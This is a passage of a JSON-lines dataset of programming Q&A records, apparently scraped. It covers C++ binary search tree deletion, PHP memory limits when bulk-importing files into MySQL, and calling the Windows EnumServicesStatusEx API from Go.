class=\"hljs-comment\"&gt;//遍历&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//遍历迭代&lt;/span&gt;\nvoid depth&lt;span class=\"hljs-constructor\"&gt;FirstSearch(BiNode&lt;span class=\"hljs-operator\"&gt;*&lt;/span&gt; &lt;span class=\"hljs-params\"&gt;root&lt;/span&gt;)&lt;/span&gt;\n{\n    stack&amp;lt;BiNode*&amp;gt;sta;\n    sta.push(root);\n    BiNode* p;\n    &lt;span class=\"hljs-keyword\"&gt;while&lt;/span&gt; (!sta.empty&lt;span class=\"hljs-literal\"&gt;()&lt;/span&gt;)\n    {\n\n        p &amp;#61; sta.top&lt;span class=\"hljs-literal\"&gt;()&lt;/span&gt;;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (p !&amp;#61; NULL)\n            cout &amp;lt;&amp;lt; p-&amp;gt;data &amp;lt;&amp;lt; &lt;span class=\"hljs-character\"&gt;&amp;#39; &amp;#39;&lt;/span&gt;;\n        sta.pop&lt;span class=\"hljs-literal\"&gt;()&lt;/span&gt;;\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (p-&amp;gt;rchild !&amp;#61; NULL)\n            sta.push(p-&amp;gt;rchild);\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (p-&amp;gt;lchild !&amp;#61; NULL)&lt;span class=\"hljs-comment\"&gt;//这里等符号写错了&lt;/span&gt;\n            sta.push(p-&amp;gt;lchild);\n\n    }\n    cout &amp;lt;&amp;lt; endl;\n}\n\n\n\n\n&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; main(void)\n{\n    &lt;span class=\"hljs-comment\"&gt;//int data[] &amp;#61; { 1,2,3,4,5,6,7,8,9,10 };&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//int len &amp;#61; sizeof(data) / sizeof(data[0]);&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//int index &amp;#61; FibonacciSearch(data,len,5);&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//cout &amp;lt;&amp;lt; index;&lt;/span&gt;\n    BiTree T &amp;#61; &lt;span class=\"hljs-constructor\"&gt;BiTree(0)&lt;/span&gt;;\n\n\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 1)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 2)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 3)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 5)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 7)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 8)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 12)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 11)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 21)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 31)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 51)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 17)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 18)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;InsertBST(&amp;amp;T, 121)&lt;/span&gt;;\n    depth&lt;span class=\"hljs-constructor\"&gt;FirstSearch(T)&lt;/span&gt;;\n\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-constructor\"&gt;SearchBST(T, 3)&lt;/span&gt; &amp;lt;&amp;lt; endl;\n\n    depth&lt;span class=\"hljs-constructor\"&gt;FirstSearch(T)&lt;/span&gt;;\n    &lt;span class=\"hljs-constructor\"&gt;DelectBST(T, 12)&lt;/span&gt;;\n    depth&lt;span class=\"hljs-constructor\"&gt;FirstSearch(T)&lt;/span&gt;;\n    return &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["二叉查找树的操作，删除节点的指针和内存释放问题", ["学习删除二叉排序树时遇到的问题，在删除结点时遇到问题，如下，注释的是我自己的想法，原本的内容是看小甲鱼的视频弄的，但感觉不太对，找了不少博客还是没解决问题", "\n", "运行结果及报错内容", "\n", "问题", "每种情况的free（p），都会报错，没搞明白。", "到底为啥？", "\n", "\nbool Delete(BiTree* t)", "//", "传输的是指针域的地址,直接修改lchild or rchild\n{\n    BiTree q, s;\n    ", "if", " ((*t)->lchild == NULL)", "//", "左子树为空，连接右子树\n    {\n        q = *t;\n        (*t) = (*t)->lchild;\n        ", "//", "q = (*t)->rchild;", "//", "连接右子树，直接改变指针\n        ", "//", "(*t)->data = q->data;\n        ", "//", "(*t)->rchild = q->rchild;\n        free(q);", "//", "删除结点所占空间\n    }\n", "\n", "源程序如下：", "\n", "#", "include", "<iostream>\n#", "include", "<stack>\nusing namespace std;\n", "//顺序查找", "\n", "int", " ", "Sq_Sear(", "int", "*", " ", "a", ", ", "int", " ", "n", ", ", "int", " ", "key", ")", "\n{\n    ", "int", " i = n;\n    ", "for", " (i = ", "0", "; i <= n; i++)", "//cpu要做两次判断，可做优化", "\n    {\n        ", "if", " (a", "[", "i", "]", " == ", "key)\n        {\n            return i;\n        }\n    }\n    return ", "0", ";\n    ", "//改进,增加一个哨兵来减少循环次数，会污染数组", "\n\n    ", "//int i = n;", "\n    ", "//a[0] = key;", "\n    ", "//while (a[i] != key)", "\n    ", "//{", "\n    ", "//    i--;", "\n    ", "//}", "\n\n    ", "//return i;", "\n\n}\n\n\n", "//插值查找(按比例查找)", "\n", "int", " bia", "_search(", "int", " ", "str", "[], ", "int", " ", "n", ", ", "int", " ", "key", ")", "\n{\n    ", "int", " low = ", "0", ", high = n-", "1", ";\n    ", "int", " mid = ", "0", ";\n    ", "while", " (low <= high)\n    {\n        ", "//折半与按比例的优劣，数的值跨度不是很大按比例更好，", "\n        mid = low + (key - str", "[", "low", "]", ")", " / ", "(str", "[", "high", "]", " - str", "[", "low", "]", ")", " * ", "(high - low);\n            ", "if", " (str", "[", "mid", "]", " == ", "key)\n                return mid;\n            ", "if", " (str", "[", "mid", "]", " > key)\n                high = mid - ", "1", ";\n            ", "if", " (str", "[", "mid", "]", " < key)\n            low = mid + ", "1", ";\n    }\n    return -", "1", ";\n\n}\n", "//斐波那契查找", "\n", "//1.首先创建斐波那契数组", "\n", "//2。找到有序表最大元素", "\n", "//3.补齐有序表最大值到最接近斐波那契数组的一个元素", "\n", "//4.根据斐波那契的规则对比查找", "\n\n\nvoid produce", "Fib(", "int", "*", " ", "fib", ", ", "int", " ", "size", ")", "\n{\n    ", "int", " i;\n    fib", "[", "0", "]", " = ", "0", ";\n    fib", "[", "1", "]", " = ", "1", ";\n    ", "for", " (i = ", "2", "; i < size; i++)\n    {\n        fib", "[", "i", "]", " = fib", "[", "i", " - ", "1", "]", " + fib", "[", "i", " - ", "2", "]", ";\n    }\n}\n\n\n", "int", " ", "FibonacciSearch(", "int", "*", " ", "data", ", ", "int", " ", "length", ", ", "int", " ", "searchValue", ")", "\n{\n    ", "int", " low = ", "0", ", high = length - ", "1", ";\n    ", "int", " i = ", "0", ",mid = ", "0", ";\n    ", "int", " fib", "[", "10", "]", ";\n    produce", "Fib(", "fib", ", ", "length", ")", ";\n\n\n    ", "int", " k = ", "0", ";", "//最接近斐波那契的数", "\n\n    ", "while", " (high > fib", "[", "k", "]", " - ", "1", ")\n    {\n        k++;\n    }\n\n\n    ", "//补齐有序表", "\n    ", "int", "* temp;\n    temp = (", "int", "*)", "new", " ", "int", "[", "fib", "[", "k", "]", " - ", "1", "];\n    memcpy(temp, data, length", " * ", "sizeof(", "int", "));\n    ", "for", " (i = length; i < fib", "[", "k", "]", " - ", "1", "; i++)\n    {\n        data", "[", "i", "]", " = data", "[", "high", "]", ";\n    }\n\n    ", "while", " (low <= high)\n    {\n        ", "if", " (k > ", "0", ")\n            mid = low + fib", "[", "k", " - ", "1", "]", " - ", "1", ";\n        ", "else", "\n            mid = low;\n        ", "if", " (temp", "[", "mid", "]", " == ", "searchValue)\n        {\n            ", "if", " (mid <= length - ", "1", ")\n                return mid;\n            ", "else", "\n                return length - ", "1", ";\n        }\n\n\n\n\n        ", "if", " (temp", "[", "mid", "]", " > searchValue)\n        {\n            high = mid - ", "1", ";\n            k = k - ", "1", ";\n        }\n        ", "if", " (temp", "[", "mid", "]", " < searchValue)\n        {\n            low = mid + ", "1", ";\n            k = k - ", "2", ";\n        }\n    }\n\n    delete", "[]", " temp;\n    return -", "1", ";\n}\n\n\ntypedef ", "struct", " BiNode\n{\n    ", "int", " data;\n    ", "struct", " BiNode* lchild;\n    ", "struct", " BiNode* rchild;\n    ", "BiNode(", "int", " ", "x", ")", " :\n        data(x), lchild(NULL), rchild(NULL) {};\n\n    \n}BiNode,*BiTree;\n\n", "//二叉查找树", "\n", "//T为搜索的树，f为记录父节点的指针，p作为临时指针保存输出", "\n", "bool", " ", "SearchBST(BiTree T, ", "int", " ", "key", ", BiTree ", "f", ", BiTree", "*", " ", "p", ")", "\n{\n    ", "if", " (!T)\n    {\n        *p = f;\n        return ", "false", ";\n    }\n    ", "else", " ", "if", "(key==T->data)\n    {\n        *p = T;\n        return ", "true", ";\n    }\n    ", "else", " ", "if", "(key < T->data)\n    {\n        return ", "SearchBST(T->", "lchild", ",", "key", ",T,", "p", ")", ";\n    }\n    ", "else", " ", "if", "(key > T->data)\n    {\n        return ", "SearchBST(T->", "rchild", ",", "key", ",T,", "p", ")", ";\n    }\n    ", "else", "\n    return ", "false", ";\n}\n", "bool", " ", "SearchBST(BiTree T, ", "int", " ", "key", ")", "\n{\n    BiTree f(", "0", ");\n    BiTree* p(", "0", ");\n     f = (BiTree)", "new", " BiTree; p = ", "new", " BiTree;\n    ", "if", " (!T)\n    {\n        *p = f;\n        return ", "false", ";\n    }\n    ", "else", " ", "if", " (key", " == ", "T->data)\n    {\n        *p = T;\n        return ", "true", ";\n    }\n    ", "else", " ", "if", " (key < T->data)\n    {\n        return ", "SearchBST(T->", "lchild", ", ", "key", ")", ";\n    }\n    ", "else", " ", "if", " (key > T->data)\n    {\n        return ", "SearchBST(T->", "rchild", ", ", "key", ")", ";\n    }\n    ", "else", "\n        return ", "false", ";\n}\n", "//删除", "\n", "//*p搜索位置结点", "\n", "//定义两个临时指针", "\n", "//三种情况", "\n\n", "bool", " ", "Delete(BiTree", "*", " ", "t", ")", "//传输的是指针域的地址,直接修改lchild or rchild", "\n{\n    BiTree q, s;\n    ", "if", " ((*t)->lchild", " == ", "NULL)", "//左子树为空，连接右子树", "\n    {\n        q = *t;\n        (*t) = (*t)->lchild;\n        ", "//q = (*t)->rchild;//连接右子树，直接改变指针", "\n        ", "//(*t)->data = q->data;", "\n        ", "//(*t)->rchild = q->rchild;", "\n        free(q);", "//删除结点所占空间", "\n    }\n    ", "else", " ", "if", " ((*t)->rchild", " == ", "NULL)", "//右子树为空，连接左子树", "\n    {\n        q = *t;\n        (*t) = (*t)->lchild;", "//连接左子树，直接改变指针", "\n        ", "//free(q);//删除结点所占空间", "\n    }\n    ", "else", "//有两个孩子", "\n    {\n        q = (*t);", "//找到中序遍历时的前驱结点，即孩子结点的右子树最右边的叶子结点", "\n        s = (*t)->lchild;\n        ", "while", " (s->rchild != NULL)\n        {\n            q = s;", "//记录当前结点值", "\n            s = s->rchild;", "//找到右子树最右边的叶子结点", "\n        }\n        (*t)->data = s->data;\n        ", "if", " (q", " == ", "*t)", "//孩子结点为目标结点", "\n        {\n            q->lchild = s->lchild;", "//链接", "\n        }\n        ", "else", "//存在右子树", "\n        {\n            q->rchild = s->lchild;", "//目标结点的父亲结点链接孩子结点", "\n        }\n        \n        free(s);\n\n    }\n    \n    return ", "true", ";\n}\n\n", "//删除二叉排序树的结点", "\n", "//1.判断是否为空树", "\n", "//2.搜索判断是否存在", "\n", "//3.执行删除函数", "\n", "int", " ", "DelectBST(BiTree T, ", "int", " ", "key", ")", "\n{\n    ", "if", " (T", " == ", "NULL)\n    {\n        return ", "false", ";\n\n    }\n\n\n    ", "else", " ", "if", " (key", " == ", "T->data)\n        {\n            return ", "Delete(&T)", ";\n        }\n    ", "else", " ", "if", "(key < T->data)\n        {\n            return ", "DelectBST(T->", "lchild", ", ", "key", ")", ";\n        }\n    ", "else", " \n        {\n            return ", "DelectBST(T->", "rchild", ",", "key", ")", ";\n        }\n    \n}\n\n\n", "//插入", "\n", "int", " ", "InsertBST(BiTree", "*", " T, ", "int", " ", "key", ")", "\n{\n    BiTree p ,s;\n\n\n    ", "//传入临时结点指针p，通过搜索函数返回当前最接近该插入值的一个节点位置", "\n    ", "if", " (!", "SearchBST(", "*", "T, ", "key", ", NULL, &", "p", ")", ")\n    {\n        s = (BiTree)", "new", " BiTree;\n        s->data = key;\n        s->lchild = NULL;\n        s->rchild = NULL;\n        ", "if", " (!p)\n        {\n            *T = s;", "//此处为插入根节点", "\n        }\n        ", "else", " ", "if", " (key < p->data)\n        {\n            p->lchild = s;\n        }\n        ", "else", "\n        {\n            p->rchild = s;\n        }\n        return ", "true", ";\n\n    }\n    ", "else", " {\n        cout << ", "\"已存在相同数据！\"", " << endl;\n        \n\n        return ", "false", ";\n    }\n}\n\n\n", "//遍历", "\n", "//遍历迭代", "\nvoid depth", "FirstSearch(BiNode", "*", " ", "root", ")", "\n{\n    stack<BiNode*>sta;\n    sta.push(root);\n    BiNode* p;\n    ", "while", " (!sta.empty", "()", ")\n    {\n        \n        p = sta.top", "()", ";\n        ", "if", " (p != NULL)\n        cout << p->data<<", "' '", ";\n        sta.pop", "()", ";\n        ", "if", " (p->rchild != NULL)\n            sta.push(p->rchild);\n        ", "if", " (p->lchild= NULL)\n            sta.push(p->lchild);\n\n    }\n    cout << endl;\n}\n\n\n\n\n", "int", " main(void)\n{\n    ", "//int data[] = { 1,2,3,4,5,6,7,8,9,10 };", "\n    ", "//int len = sizeof(data) / sizeof(data[0]);", "\n    ", "//int index = FibonacciSearch(data,len,5);", "\n    ", "//cout << index;", "\n    BiTree T = ", "BiTree(0)", ";\n    \n    \n    ", "InsertBST(&T, 1)", ";\n    ", "InsertBST(&T, 2)", ";\n    ", "InsertBST(&T, 3)", "; \n    ", "InsertBST(&T, 5)", ";\n    ", "InsertBST(&T, 7)", ";\n    ", "InsertBST(&T, 8)", "; \n    ", "InsertBST(&T, 12)", ";\n    ", "InsertBST(&T, 11)", ";\n    ", "InsertBST(&T, 21)", ";\n    ", "InsertBST(&T, 31)", ";\n    ", "InsertBST(&T, 51)", ";\n    ", "InsertBST(&T, 17)", ";\n    ", "InsertBST(&T, 18)", ";\n    ", "InsertBST(&T, 121)", ";\n    depth", "FirstSearch(T)", ";\n    \n    cout << ", "SearchBST(T, 3)", " << endl;\n\n    depth", "FirstSearch(T)", ";\n    ", "DelectBST(T,12)", ";\n    depth", "FirstSearch(T)", ";\n    return ", "0", ";\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Personally, I would go slightly different about it. These are the steps I would do:&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;Open a PDO connection, set PDO in Exception mode&lt;/li&gt;\n&lt;li&gt;Get a list of files that I want to read&lt;/li&gt;\n&lt;li&gt;Create a class that can utilize PDO and the list of files and perform insertions&lt;/li&gt;\n&lt;li&gt;Prepare the statement ONCE, utilize it many times&lt;/li&gt;\n&lt;li&gt;Chunk PDO transaction commits to 50 (configurable) inserts - this means that every 50th time I call $stmt-&amp;gt;execute(), I issue a commit - which utilizes the HDD better thus making it faster&lt;/li&gt;\n&lt;li&gt;Read each file line by line&lt;/li&gt;\n&lt;li&gt;Parse the line and check if it's valid&lt;/li&gt;\n&lt;li&gt;If yes, add to MySQL, if not - report an error&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;Now, I've created 2 classes and example on how I'd go about it. I tested only up to the reading part since I don't know your DB structure nor what AUX() does.&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;class ImportFiles\n{\n    protected $pdo;\n    protected $statements;\n    protected $transaction = false;\n    protected $trx_flush_count = 50; // Commit the transaction at every 50 iterations\n\n    public function __construct(PDO $pdo = null)\n    {\n        $this-&amp;gt;pdo = $pdo;\n\n        $this-&amp;gt;stmt = $this-&amp;gt;pdo-&amp;gt;prepare(\"INSERT INTO table \n                                                (ID,PAR1,PAR2,PARN)\n                                            VALUES \n                                                (?,?,?,?) \n                                            ON DUPLICATE KEY UPDATE ID = VALUES(ID), PAR1 = VALUES(PAR1), PAR2 = VALUES(PAR2), PAR3 = VALUES(PAR3), PARN = VALUES(PARN)\");\n    }\n\n    public function import($file)\n    {\n        if($this-&amp;gt;isReadable($file))\n        {\n            $file = new FileParser($file);\n\n            $this-&amp;gt;insert($file);\n        }\n        else\n        {\n            printf(\"\nSpecified file is not readable: %s\", $file);\n        }\n    }\n\n    protected function isReadable($file)\n    {\n        return (is_file($file) &amp;amp;&amp;amp; is_readable($file));\n    }   \n\n    protected function insert(FileParser $file)\n    {\n        while($file-&amp;gt;read())\n        {\n            //printf(\"\nLine %d, value: %s\", $file-&amp;gt;getLineCount(), $file-&amp;gt;getLine());\n\n            $this-&amp;gt;insertRecord($file);\n\n            $this-&amp;gt;flush($file);\n        }\n\n        $this-&amp;gt;flush(null);\n    }\n\n    // Untested method, no idea whether it does its job or not - might fail\n    protected function flush(FileParser $file = null)\n    {\n        if(!($file-&amp;gt;getLineCount() % 50) &amp;amp;&amp;amp; !is_null($file))\n        {\n            if($this-&amp;gt;pdo-&amp;gt;inTransaction())\n            {\n                $this-&amp;gt;pdo-&amp;gt;commit();\n\n                $this-&amp;gt;pdo-&amp;gt;beginTransaction();\n            }\n        }\n        else\n        {\n            if($this-&amp;gt;pdo-&amp;gt;inTransaction())\n            {\n                $this-&amp;gt;pdo-&amp;gt;commit();\n            }\n        }\n    }   \n\n    protected function insertRecord(FileParser $file)\n    {\n        $check_value = $file-&amp;gt;getParsedLine(25);\n\n        if(!empty($check_value))\n        {\n            $values = [ \n                $file-&amp;gt;getParsedLine[0],\n                $file-&amp;gt;getParsedLine[1],\n                $file-&amp;gt;getParsedLine[2],\n                $file-&amp;gt;getParsedLine[5]\n            ];\n        }\n        else\n        {\n            $values = [ \n                $file-&amp;gt;getParsedLine[10],\n                $file-&amp;gt;getParsedLine[11],\n                $file-&amp;gt;getParsedLine[12],\n                $file-&amp;gt;getParsedLine[15]\n            ];      \n        }\n\n        $this-&amp;gt;stmt-&amp;gt;execute($values);\n    }\n}\n\nclass FileParser\n{\n    protected $fh;\n    protected $lineCount = 0;\n    protected $line = null;\n    protected $aux;\n\n    public function __construct($file)\n    {\n        $this-&amp;gt;fh = fopen($file, 'r');\n    }\n\n    public function read()\n    {\n        $this-&amp;gt;line = fgets($this-&amp;gt;fh);\n\n        if($this-&amp;gt;line !== false) $this-&amp;gt;lineCount++;\n\n        return $this-&amp;gt;line;\n    }\n\n    public function getLineCount()\n    {\n        return $this-&amp;gt;lineCount;\n    }\n\n    public function getLine()\n    {\n        return $this-&amp;gt;line;\n    }\n\n    public function getParsedLine($index = null)\n    {\n        $line = $this-&amp;gt;line;\n\n        if(!is_null($line))\n        {\n            $line = utf8_encode($line);\n            $array_line = explode(\"|\", $line);\n\n            //set null values where i neeed\n            $aux = $this-&amp;gt;getAUX();\n            $array_line = $aux-&amp;gt;null_value($array_line);\n\n            if(sizeof($array_line) &amp;gt; 32)\n            {   \n                return is_null($index) ? $array_line : isset($array_line[$index]) ? $array_line[$index] : null;\n            }\n            else\n            {\n                throw new \\Exception(sprintf(\"Invalid array size, expected &amp;gt; 32 got: %s\", sizeof($array_line)));\n            }\n        }\n        else\n        {\n            return [];\n        }\n    }\n\n    protected function getAUX()\n    {\n        if(is_null($this-&amp;gt;aux))\n        {\n            $this-&amp;gt;aux = new AUX();\n        }\n\n        return $this-&amp;gt;aux;\n    }\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;Usage:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;$dsn = 'mysql:dbname=testdb;host=127.0.0.1';\n$user = 'dbuser';\n$password = 'dbpass';\n\ntry \n{\n    $pdo = new PDO($dsn, $user, $password);\n\n    $pdo-&amp;gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\n    $import = new ImportFiles($pdo);\n\n    $files = ['/usr/local/file1.txt', '/usr/local/file2.txt'];\n\n    foreach($files as $file)\n    {\n        $import-&amp;gt;import($file);\n    }\n\n} catch (Exception $e) \n{\n    printf(\"\nError: %s\", $e-&amp;gt;getMessage());\n    printf(\"\nFile: %s\", $e-&amp;gt;getFile());\n    printf(\"\nLine: %s\", $e-&amp;gt;getLine());\n}\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["php内存限制垃圾收集器", ["\n\n", "3 days crashing my head towards a wall.", "\n\n", "I developed a php script for import big text files and populate mysql database. Until i get 2 million records it works perfectly but i need to import like 10 million rows divided in different files.", "\n\n", "My application scans files in a folder, get file extension (i have 4 kind of procedures import for 4 different extensions) and call the relative import function.", "\n\n", "I have a structure made of theese classes:", "\n\n", "CLASS SUBJECT1{ public function import_data_1(){\n    __DESTRUCT(){$this->childObject = null;}\n    IMPORT SUBJECT1(){\n    //fopen($file);\n    //ob_start();\n    //PDO::BeginTransaction();\n    //WHILE (FILE) {\n    //PREPARED STATEMENT        \n    //FILE READING\n    //GET FILE LINE\n    //EXECUTE INSERT\n    //} END WHILE\n    //PDO::Commit();\n    //ob_clean(); or ob_flush();\n    //fclose($file);\n    //clearstatcache();\n   }\n};}\n\nCLASS SUBJECT2{ same as SUBJECT1;}\n\nCLASS SUBJECT3{ same as SUBJECT1;}\n\nCLASS SUBJECT4{ same as SUBJECT1;}\n", "\n\n", "and the main class that launches the procedure:", "\n\n", "CLASS MAIN{\n   switch($ext)\n     case \"ext1\":\n        $SUBJECT1 = new SUBJECT1();\n        IMPORT_SUBJECT1();\n        unset $SUBJECT1;\n        $SUBJECT1 = null;\n        break;\n     case \"ext2\": //SAME AS CASE ext1 WITH IMPORT_SUBJECT2();\n     case \"ext3\": //SAME AS CASE ext1 WITH IMPORT_SUBJECT3();\n     case \"ext4\": //SAME AS CASE ext1 WITH IMPORT_SUBJECT4();\n\n}\n", "\n\n", "It works perfectly with some adjustement of mysql file buffers (ib_logfile0 and ib_logfile1 are set as 512Mb).", "\n\n", "The problem is that everytime a procedure is terminated php does not free memory. I'm sure that destructor is called (i put an echo inside __destruct method) and the object is not accesible (var_dump say is NULL). I tried so many ways to free memory but now i'm at a dead point.", "\n\n", "I also verified \n    gc_collect_cycles() \nin many different point of code and it always says 0 cycles so all abject are not referenced each other. \nI tried even to delete class structure and call all the code sequential but i always get this error:", "\n\n", "Fatal error: Out of memory (allocated 511180800) (tried to allocate 576 bytes) in C:\\php\\index.php on line 219 (line 219 is execute of a PS on the 13th file).", "\n\n", "The memory is used in this way:", "\n\n", "\n", "php script: 52MB", "\n", "end first file import :110MB", "\n", "destructors and unset calling: 110MB", "\n", "new procedure calling: 110MB", "\n", "end second file import 250MB", "\n", "destructors and unset calling: 250MB", "\n", "new procedure calling: 250MB", "\n", "\n", "So as you can see even unsetting objects they don't free memory.", "\n\n", "I tried setting php ini memory size to 1024M but it grows up really fast and crashes after 20 files.", "\n\n", "Any advice?", "\n\n", "Many thanks!", "\n\n", "EDIT 1:", "\n\n", "posting code:", "\n\n", "class SUBJECT1{\n\n    public function __destruct()\n    {\n        echo 'destroying subject1 <br/>';\n    }\n\n    public function import_subject1($file,$par1,$par2){\n        global $pdo;\n\n        $aux            = new AUX();\n        $log            = new LOG();\n\n// ---------------- FILES  ----------------\n        $input_file    = fopen($file, \"r\");\n\n// ---------------- PREPARED STATEMENT  ----------------\n\n$PS_insert_data1= $pdo->prepare(\"INSERT INTO table (ID,PAR1,PAR2,PARN) VALUES (?,?,?,?) ON DUPLICATE KEY UPDATE ID = VALUES(ID), PAR1 = VALUES(PAR1), PAR2 = VALUES(PAR2), PAR3 = VALUES(PAR3), PARN = VALUES(PARN)\");\n\n$PS_insert_data2= $pdo->prepare(\"INSERT INTO table (ID,PAR1,PAR2,PARN) VALUES (?,?,?,?) ON DUPLICATE KEY UPDATE ID = VALUES(ID), PAR1 = VALUES(PAR1), PAR2 = VALUES(PAR2), PAR3 = VALUES(PAR3), PARN = VALUES(PARN)\");\n\n//IMPORT\nif ($input_file) {\n  ob_start();\n  $pdo->beginTransaction();\n  while (($line = fgets($input_file)) !== false) {\n  $line = utf8_encode($line);\n  $array_line = explode(\"|\", $line);\n  //set null values where i neeed\n  $array_line = $aux->null_value($array_line);\n\n  if(sizeof($array_line)>32){    \n     if(!empty($array_line[25])){\n          $PS_insert_data1->execute($array_line[0],$array_line[1],$array_line[2],$array_line[5]);\n     }\n\n  $PS_insert_data2->execute($array_line[10],$array_line[11],$array_line[12],$array_line[15]);\n  }\n\n$pdo->commit();    \nflush();\nob_clean();\nfclose($f_titolarita);\nclearstatcache();\n}\n", "\n\n", "I do this iterative for all files of my folder, the other procedures are the same concept. \nI still have increase of memory and now it crashes with a white page response :-\\", "\n    "]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;After the suggestions from @alex, I've got the following example code working.&lt;/p&gt;\n\n&lt;p&gt;Looks like we create a byte slice of the right size then use the unsafe class to cast to our struct type.&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;    _, _, _ = svcEnumServicesStatusEx.Call(\n        uintptr(handle),\n        uintptr(uint32(SVC_SC_ENUM_PROCESS_INFO)),\n        uintptr(uint32(SVC_SERVICE_WIN32)),\n        uintptr(uint32(SVC_SERVICE_STATE_ALL)),\n        uintptr(0),\n        0,\n        uintptr(unsafe.Pointer(&amp;amp;bytesReq)),\n        uintptr(unsafe.Pointer(&amp;amp;numReturned)),\n        uintptr(unsafe.Pointer(&amp;amp;resumeHandle)),\n        uintptr(0),\n    )\n\n    if bytesReq &amp;gt; 0 {\n        var buf []byte = make([]byte, bytesReq)\n\n        ret, _, _ := svcEnumServicesStatusEx.Call(\n            uintptr(handle),\n            uintptr(uint32(SVC_SC_ENUM_PROCESS_INFO)),\n            uintptr(uint32(SVC_SERVICE_WIN32)),\n            uintptr(uint32(SVC_SERVICE_STATE_ALL)),\n            uintptr(unsafe.Pointer(&amp;amp;buf[0])),\n            uintptr(bytesReq),\n            uintptr(unsafe.Pointer(&amp;amp;bytesReq)),\n            uintptr(unsafe.Pointer(&amp;amp;numReturned)),\n            uintptr(unsafe.Pointer(&amp;amp;resumeHandle)),\n            uintptr(0),\n        )\n\n        if ret &amp;gt; 0 {\n            var sizeTest ENUM_SERVICE_STATUS_PROCESS\n            iter := uintptr(unsafe.Pointer(&amp;amp;buf[0]))\n\n            for i := uint32(0); i &amp;lt; numReturned; i++ {\n                var data *ENUM_SERVICE_STATUS_PROCESS = (*ENUM_SERVICE_STATUS_PROCESS)(unsafe.Pointer(iter))\n\n                fmt.Printf(\"Service Name: %s - Display Name: %s - %#v\r\n\", syscall.UTF16ToString((*[4096]uint16)(unsafe.Pointer(data.lpServiceName))[:]), syscall.UTF16ToString((*[4096]uint16)(unsafe.Pointer(data.lpDisplayName))[:]), data.ServiceStatusProcess)\n\n                iter = uintptr(unsafe.Pointer(iter + unsafe.Sizeof(sizeTest)))\n            }\n        } else {\n            return nil, fmt.Errorf(\"Failed to get Service List even with allocated memory.\")\n        }\n    } else {\n        return nil, fmt.Errorf(\"Unable to get size of required memory allocation.\")\n    }\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在Go中调用EnumServicesStatusEx，内存分配？", ["\n\n", "I'm writing an app that interacts with the Windows API from a Windows Service.", "\n\n", "After loads of help from @chowey ", "here", ", I sort of got the hang of things and started a basic library which I've put on GitHub ", "here", ".", "\n\n", "I've now moved on to \"Services\", with the requirement to list all Windows Services on a machine, start, stop, restart them. The start/stop/restart look pretty straight forward once you've got a service handle to work with, but I'm struggling with getting a list of installed services.", "\n\n", "EnumServicesStatusEx", " in Advapi32.dll is the function I need to call, but it requires a pointer to pre-allocated memory for an array of ", "ENUM_SERVICE_STATUS_PROCESS", " structs.", "\n\n", "You can call the function with a null pointer and it will return the memory allocation size required, but I don't believe there is a way to directly allocate memory in Go.", "\n\n", "At first I thought I could get the memory allocation requirement, divide it by the SizeOf the struct using the unsafe package, create a slice containing that number of elements, then pass a pointer to the first element to the function, but it says the memory needs to include space for the string data, which this wouldn't.", "\n\n", "Does anyone know how this could be accomplished, pretty please? :).", "\n    "]], "Tag": "程序设计"}
